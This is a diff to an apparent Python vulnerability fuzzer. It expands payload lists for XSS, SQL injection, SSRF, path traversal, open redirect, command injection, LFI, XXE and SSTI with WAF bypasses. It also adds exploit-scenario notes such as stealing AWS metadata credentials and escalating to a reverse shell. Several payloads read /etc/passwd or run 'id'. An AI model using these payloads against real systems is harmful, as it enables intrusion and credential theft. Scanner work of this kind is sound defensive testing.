@@ -53,6 +53,15 @@ class FuzzResult:
     response_snippet: str = ""
     false_positive_check: str = ""  # Result of FP analysis
     verified: bool = True  # Whether finding passed FP checks
+    # NEW: Detailed vulnerability information
+    vuln_name: str = ""
+    description: str = ""
+    impact: str = ""
+    remediation: str = ""
+    cwe: str = ""
+    cvss: float = 0.0
+    exploit_scenario: str = ""
+    references: List[str] = field(default_factory=list)
 
 
 @dataclass
@@ -68,19 +77,47 @@ class FuzzSummary:
 
 # Safe test payloads - designed to detect vulnerabilities without causing harm
 # Each payload config includes enhanced detection with FP-aware validation
+# Updated with WAF bypasses, encoding variations, and polyglot techniques
 FUZZ_PAYLOADS = {
     "xss": {
         "payloads": [
-            # Reflection detection
+            # Basic reflection detection
             "<xss_test_{{CANARY}}>",
-            "'\"><xss_test_{{CANARY}}>",
-            "javascript:xss_test_{{CANARY}}//",
-            # Event handlers
-            "'\"><img src=x onerror=xss_{{CANARY}}>",
-            # Template injection probe
+            "'\"<xss_test_{{CANARY}}>",
+            
+            # Case variation (WAF bypass)
+            "<ScRiPt>alert({{CANARY}})</sCrIpT>",
+            
+            # Event handlers (various contexts)
+            "'\"><img src=x onerror=alert({{CANARY}})>",
+            "'\"><svg/onload=alert({{CANARY}})>",
+            "<body onload=alert({{CANARY}})>",
+            "<marquee onstart=alert({{CANARY}})>",
+            
+            # Polyglot XSS
+            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert({{CANARY}})//'>",
+            
+            # Comment-based bypass
+            "<script/*foo*/>alert({{CANARY}})</script>",
+            "<scr<script>ipt>alert({{CANARY}})</scr</script>ipt>",
+            
+            # Encoding bypasses
+            "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;({{CANARY}})>",
+            "<img src=x onerror=\u0061\u006C\u0065\u0072\u0074({{CANARY}})>",
+            
+            # Template injection probes (also SSTI)
             "{{7*7}}",
             "${7*7}",
             "<%=7*7%>",
+            "#{7*7}",
+            
+            # DOM XSS vectors
+            "javascript:alert({{CANARY}})",
+            "data:text/html,<script>alert({{CANARY}})</script>",
+            
+            # Attribute-based
+            "' autofocus onfocus=alert({{CANARY}}) x='",
+            "\" autofocus onfocus=alert({{CANARY}}) x=\"",
         ],
         "detect": lambda resp, canary: _detect_xss(resp, canary),
         "validate": lambda resp, payload, canary: _validate_xss(resp, payload, canary),
@@ -92,14 +129,42 @@ FUZZ_PAYLOADS = {
             # Error-based detection
             "'",
             "\"",
-            "' OR '1'='1",
-            "1' AND '1'='1",
-            "1 UNION SELECT NULL--",
-            # Time-based canary (won't actually delay)
-            "1' AND SLEEP(0)--",
+            "`",
+            
             # Boolean-based
-            "1 AND 1=1",
-            "1 AND 1=2",
+            "' OR '1'='1",
+            "' OR '1'='1'--",
+            "' OR '1'='1'#",
+            "1' AND '1'='1",
+            "1' AND '1'='2",
+            
+            # Union-based  
+            "1 UNION SELECT NULL--",
+            "1' UNION SELECT NULL--",
+            "1\" UNION SELECT NULL--",
+            "1 UNION ALL SELECT NULL,NULL,NULL--",
+            
+            # Time-based (safe - won't actually delay)
+            "1' AND SLEEP(0)--",
+            "1' AND pg_sleep(0)--",
+            "1' WAITFOR DELAY '00:00:00'--",
+            
+            # WAF bypasses
+            "1'/**/OR/**/('1'='1",
+            "1' OR/**/'1'/**=/**/'1",
+            "1' UnIoN SeLeCt NULL--",
+            
+            # Encoding bypasses
+            "1'%20OR%20'1'%3D'1",
+            "1'%0aOR%0a'1'%0a=%0a'1",
+            
+            # Comment injection
+            "1'/**/AND/**/1=1--",
+            "1'/*!50000AND*/1=1--",
+            
+            # Stacked queries
+            "1'; SELECT NULL--",
+            "1\"; SELECT NULL--",
         ],
         "detect": lambda resp, _: _detect_sqli(resp),
         "validate": lambda resp, payload, _: _validate_sqli(resp, payload),
@@ -110,14 +175,40 @@ FUZZ_PAYLOADS = {
         "payloads": [
             # Localhost variations
             "http://127.0.0.1",
-            "http://localhost",
+            "http://localhost",  
             "http://[::1]",
+            "http://0.0.0.0",
+            "http://0",  # Bypass: 0 = localhost
+            
+            # Localhost with ports
             "http://127.0.0.1:80",
-            # Cloud metadata (safe - will just fail if no SSRF)
+            "http://127.0.0.1:22",
+            "http://127.0.0.1:3306",
+            "http://localhost:8080",
+            
+            # Cloud metadata endpoints
             "http://169.254.169.254/latest/meta-data/",
-            "http://metadata.google.internal/",
-            # DNS rebinding probe
+            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+            "http://metadata.google.internal/computeMetadata/v1/",
+            "http://metadata.google.internal/computeMetadata/v1/instance/",
+            
+            # DNS rebinding
             "http://localtest.me",
+            "http://spoofed.burpcollaborator.net",
+            
+            # IPv6 localhost
+            "http://[::]:80",
+            "http://[0:0:0:0:0:0:0:1]",
+            
+            # URL encoding bypasses
+            "http://127.0.0.1",
+            "http://127.1",  # Short form
+            "http://2130706433",  # Decimal IP
+            "http://0x7f.0x0.0x0.0x1",  # Hex IP
+            
+            # Protocol smuggling
+            "file:///etc/passwd",
+            "gopher://127.0.0.1:6379/_",
         ],
         "detect": lambda resp, _: _detect_ssrf(resp),
         "validate": lambda resp, payload, _: _validate_ssrf(resp, payload),
@@ -130,11 +221,28 @@ FUZZ_PAYLOADS = {
             "../../../etc/passwd",
             "..\\..\\..\\windows\\win.ini",
             "....//....//....//etc/passwd",
-            # Encoded versions
+            
+            # URL encoding
             "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
-            "..%252f..%252f..%252fetc/passwd",
-            # Null byte (legacy)
+            "..%252f..%252f..%252fetc/passwd",  # Double encoding
+            "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
+            
+            # Unicode/UTF-8
+            "..%c0%af..%c0%af..%c0%afetc/passwd",
+            "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",
+            
+            # Null byte (legacy systems)
             "../../../etc/passwd%00",
+            "../../../etc/passwd%00.jpg",
+            
+            # Absolute paths
+            "/etc/passwd",
+            "C:\\windows\\win.ini",
+            "file:///etc/passwd",
+            
+            # Bypass filters
+            "..;/..;/..;/etc/passwd",
+            ".../.../.../.../etc/passwd",
         ],
         "detect": lambda resp, _: _detect_path_traversal(resp),
         "validate": lambda resp, payload, _: _validate_path_traversal(resp),
@@ -143,13 +251,33 @@ FUZZ_PAYLOADS = {
     },
     "open_redirect": {
         "payloads": [
+            # Protocol-relative
             "//evil.com",
-            "https://evil.com",
-            "/\\evil.com",
-            "//evil.com/%2f..",
             "///evil.com",
             "////evil.com",
+            
+            # Full URL
+            "https://evil.com",
+            "http://evil.com",
+            
+            # Bypass filters
+            "/\\evil.com",
+            "//evil.com/%2f..",
             "https:evil.com",
+            "//evil.com@attacker.com",
+            
+            # URL encoding
+            "%2f%2fevil.com",
+            "https:%2f%2fevil.com",
+            
+            # CRLF injection
+            "/%0d%0aLocation:%20https://evil.com",
+            
+            # JavaScript protocol  
+            "javascript:window.location='https://evil.com'",
+            
+            # Data URI
+            "data:text/html,<script>window.location='https://evil.com'</script>",
         ],
         "detect": lambda resp, _: _detect_open_redirect(resp),
         "validate": lambda resp, payload, _: _validate_open_redirect(resp, payload),
@@ -158,14 +286,39 @@ FUZZ_PAYLOADS = {
     },
     "command_injection": {
         "payloads": [
-            # Safe detection only - won't execute
+            # Safe detection - echo canary
             "|echo cmd_test_{{CANARY}}",
             ";echo cmd_test_{{CANARY}}",
             "`echo cmd_test_{{CANARY}}`",
             "$(echo cmd_test_{{CANARY}})",
-            # Error indicators
+            
+            # WAF bypasses
+            ";echo${IFS}cmd_test_{{CANARY}}",  # Space bypass with IFS
+            "|cat${IFS}/etc/passwd",
+            ";cat%09/etc/passwd",  # Tab character
+            
+            # Newline injection
+            "%0aecho cmd_test_{{CANARY}}",
+            "%0d%0aecho cmd_test_{{CANARY}}",
+            
+            # Command chaining
             "| ls",
             "; cat /etc/passwd",
+            "& whoami",
+            "&& id",
+            "|| uname -a",
+            
+            # Backticks
+            "`whoami`",
+            "`id`",
+            
+            # Windows-specific
+            "| dir",
+            "& type C:\\windows\\win.ini",
+            
+            # Encoding bypasses
+            ";cat</etc/passwd",  # Redirect-based
+            ";{cat,/etc/passwd}",  # Brace expansion
         ],
         "detect": lambda resp, canary: _detect_cmdi(resp, canary),
         "validate": lambda resp, payload, canary: _validate_cmdi(resp, payload, canary),
@@ -176,11 +329,33 @@ FUZZ_PAYLOADS = {
         "payloads": [
             # PHP wrappers
             "php://filter/convert.base64-encode/resource=index.php",
+            "php://filter/read=string.rot13/resource=index.php",
             "php://input",
+            "php://stdin",
+            
+            # Data wrapper
             "data://text/plain,<?php phpinfo();?>",
-            # Log injection
+            "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
+            
+            # expect wrapper (if enabled)
+            "expect://id",
+            "expect://whoami",
+            
+            # Log poisoning targets
             "/var/log/apache2/access.log",
             "/var/log/nginx/access.log",
+            "/var/log/apache/access.log",
+            
+            # proc pseudo-filesystem
+            "/proc/self/environ",
+            "/proc/self/cmdline",
+            
+            # Session files
+            "/var/lib/php/sessions/sess_{{CANARY}}",
+            
+            # Common config files
+            "/etc/php.ini",
+            "/usr/local/etc/php.ini",
         ],
         "detect": lambda resp, _: _detect_lfi(resp),
         "validate": lambda resp, payload, _: _validate_lfi(resp, payload),
@@ -189,8 +364,17 @@ FUZZ_PAYLOADS = {
     },
     "xxe": {
         "payloads": [
-            # XXE probe (won't work unless app parses XML)
+            # Basic XXE probe
             '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe "xxe_test_{{CANARY}}">]><foo>&xxe;</foo>',
+            
+            # External entity
+            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
+            
+            # Parameter entity
+            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>',
+            
+            # CDATA exfiltration
+            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo><![CDATA[&xxe;]]></foo>',
         ],
         "detect": lambda resp, canary: f"xxe_test_{canary}" in resp.text,
         "validate": lambda resp, payload, canary: _validate_xxe(resp, canary),
@@ -199,14 +383,52 @@ FUZZ_PAYLOADS = {
     },
     "ssti": {
         "payloads": [
-            # Template injection probes
+            # Jinja2 (Python)
             "{{7*7}}",
-            "${7*7}",
-            "#{7*7}",
-            "{{constructor.constructor('return this')()}}",
-            "${T(java.lang.Runtime)}",
-            "<%= 7*7 %>",
+            "{{config}}",
+            "{{self}}",
+            "{{''.__class__.__mro__[1].__subclasses__()}}",
+            
+            # Twig (PHP)
+            "{{7*7}}",
+            "{{_self}}",
+            "{{dump(app)}}",
+            
+            # Smarty (PHP)
             "{php}echo 7*7;{/php}",
+            "{$smarty.version}",
+            
+            # FreeMarker (Java)
+            "${7*7}",
+            "${class.forName('java.lang.Runtime')}",
+            "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
+            
+            # Velocity (Java)
+            "#set($x=7*7)$x",
+            "$class.inspect('java.lang.Runtime')",
+            
+            # Thymeleaf (Java)
+            "${7*7}",
+            "__${7*7}__::.x",
+            
+            # ERB (Ruby)
+            "<%=7*7%>",
+            "<%= File.open('/etc/passwd').read %>",
+            
+            # Pug/Jade (Node.js)
+            "#{7*7}",
+            "#{global.process.mainModule.require('child_process').execSync('id')}",
+            
+            # Handlebars (Node.js)
+            "{{7*7}}",
+            "{{constructor.constructor('return this')()}}",
+            
+            # AngularJS
+            "{{constructor.constructor('alert(1)')()}}",
+            "{{$on.constructor('alert(1)')()}}",
+            
+            # Polyglot SSTI
+            "${7*7}{{7*7}}<%=7*7%>#{7*7}",
         ],
         "detect": lambda resp, _: _detect_ssti(resp),
         "validate": lambda resp, payload, _: _validate_ssti(resp, payload),
@@ -214,6 +436,102 @@ FUZZ_PAYLOADS = {
         "requires_html": True,
     },
 }
+
+
+# Vulnerability DB - Concise Bug Bounty Info Only
+VULN_DETAILS = {
+    "xss": {
+        "name": "Cross-Site Scripting (XSS)",
+        "description": "Input reflected in HTML without encoding - JavaScript executes in victim's browser",
+        "impact": "Steal cookies, hijack sessions, deface pages",
+        "exploit_scenario": "1. Inject: <script>alert(document.cookie)</script>\n2. If popup appears → XSS confirmed\n3. Escalate: Steal cookies/tokens, redirect to phishing",
+        "remediation": "Encode output, use CSP headers",
+        "cwe": "CWE-79",
+        "cvss": 7.1,
+        "references": ["https://portswigger.net/web-security/cross-site-scripting"]
+    },
+    "sqli": {
+        "name": "SQL Injection",
+        "description": "Input inserted into SQL queries - can manipulate database",
+        "impact": "Dump entire database, auth bypass, sometimes RCE",
+        "exploit_scenario": "1. Inject: ' OR '1'='1\n2. Check for SQL errors or changed behavior\n3. Use UNION to extract data: UNION SELECT table_name FROM information_schema.tables--",
+        "remediation": "Use parameterized queries ONLY",
+        "cwe": "CWE-89",
+        "cvss": 9.3,
+        "references": ["https://portswigger.net/web-security/sql-injection"]
+    },
+    "ssrf": {
+        "name": "Server-Side Request Forgery",
+        "description": "Server makes requests to attacker-controlled URLs",
+        "impact": "Access internal services, steal cloud credentials (AWS keys)",
+        "exploit_scenario": "1. Inject: http://169.254.169.254/latest/meta-data/iam/security-credentials/\n2. Check response for AWS keys/credentials\n3. Use keys to access cloud resources",
+        "remediation": "Whitelist allowed domains",
+        "cwe": "CWE-918",
+        "cvss": 8.6,
+        "references": ["https://portswigger.net/web-security/ssrf"]
+    },
+    "path_traversal": {
+        "name": "Path Traversal",
+        "description": "Read arbitrary files using ../ sequences",
+        "impact": "Read /etc/passwd, config files, source code, SSH keys",
+        "exploit_scenario": "1. Inject: ../../../etc/passwd\n2. Check for 'root:x:' in response\n3. Try: ../../../app/config.php for credentials",
+        "remediation": "Whitelist allowed files",
+        "cwe": "CWE-22",
+        "cvss": 9.1,
+        "references": ["https://portswigger.net/web-security/file-path-traversal"]
+    },
+    "open_redirect": {
+        "name": "Open Redirect",
+        "description": "Redirects to attacker-controlled URLs",
+        "impact": "Phishing with legitimate domain, OAuth token theft",
+        "exploit_scenario": "1. Inject: //evil.com\n2. Check if redirect happens\n3. Chain with OAuth for account takeover",
+        "remediation": "Whitelist redirect destinations",
+        "cwe": "CWE-601",
+        "cvss": 4.7,
+        "references": ["https://owasp.org/www-community/attacks/Open_Redirect"]
+    },
+    "command_injection": {
+        "name": "OS Command Injection",
+        "description": "Execute arbitrary system commands",
+        "impact": "Full server compromise",
+        "exploit_scenario": "1. Inject: ;whoami\n2. Check for username in response\n3. Escalate: ;cat /etc/passwd or reverse shell",
+        "remediation": "NEVER use shell commands with user input",
+        "cwe": "CWE-78",
+        "cvss": 9.8,
+        "references": ["https://portswigger.net/web-security/os-command-injection"]
+    },
+    "lfi": {
+        "name": "Local File Inclusion",
+        "description": "Include/read local files via PHP wrappers",
+        "impact": "Read source code, configs, can lead to RCE",
+        "exploit_scenario": "1. Inject: php://filter/convert.base64-encode/resource=index.php\n2. Decode base64 to read source\n3. Try log poisoning for RCE",
+        "remediation": "Whitelist allowed files",
+        "cwe": "CWE-98",
+        "cvss": 8.8,
+        "references": ["https://portswigger.net/web-security/file-path-traversal"]
+    },
+    "xxe": {
+        "name": "XML External Entity (XXE)",
+        "description": "XML parser reads external entities - file disclosure",
+        "impact": "Read local files, SSRF, sometimes RCE",
+        "exploit_scenario": "1. Send XML with: <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n2. Reference &xxe; in XML body\n3. Check response for file contents",
+        "remediation": "Disable external entities in XML parser",
+        "cwe": "CWE-611",
+        "cvss": 9.1,
+        "references": ["https://portswigger.net/web-security/xxe"]
+    },
+    "ssti": {
+        "name": "Server-Side Template Injection",
+        "description": "Template engine executes injected code",
+        "impact": "Remote Code Execution, full server takeover",
+        "exploit_scenario": "1. Inject: {{7*7}}\n2. If result is '49' → SSTI confirmed\n3. Escalate to RCE with template-specific payloads",
+        "remediation": "Never put user input in templates",
+        "cwe": "CWE-94",
+        "cvss": 9.6,
+        "references": ["https://portswigger.net/research/server-side-template-injection"]
+    }
+}
+
 
 
 # Enhanced detection functions with context awareness
@@ -607,10 +925,23 @@ class ParamFuzzer:
                         
                     if is_verified:
                         self.stats['verified_findings'] += 1
+                        
+                        # Get detailed vulnerability information
+                        vuln_details = VULN_DETAILS.get(vuln_type, {})
+                        
                         results.append(FuzzResult(
                             url=url, parameter=param, vuln_type=vuln_type,
                             payload=test_payload, evidence=validation_msg,
-                            severity=config["severity"], confidence="high"
+                            severity=config["severity"], confidence="high",
+                            # Detailed information
+                            vuln_name=vuln_details.get("name", vuln_type.upper()),
+                            description=vuln_details.get("description", ""),
+                            impact=vuln_details.get("impact", ""),
+                            exploit_scenario=vuln_details.get("exploit_scenario", ""),
+                            remediation=vuln_details.get("remediation", ""),
+                            cwe=vuln_details.get("cwe", ""),
+                            cvss=vuln_details.get("cvss", 0.0),
+                            references=vuln_details.get("references", [])
                         ))
                     else:
                         self.stats['false_positives_filtered'] += 1
